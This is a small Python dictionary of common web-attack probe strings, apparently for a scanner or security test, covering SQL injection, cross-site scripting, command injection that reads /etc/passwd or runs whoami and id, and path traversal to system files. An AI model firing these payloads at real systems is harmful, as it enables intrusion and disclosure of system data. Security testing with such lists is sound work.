PAYLOADS = {
    "sqli": ["' OR '1'='1", "admin' --", "' UNION SELECT NULL --"],
    "xss": ["<script>alert(1)</script>", "\" onmouseover=alert(1) \""],
    "command_injection": ["; cat /etc/passwd", "&& whoami", "| id"],
    "path_traversal": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini"],
}
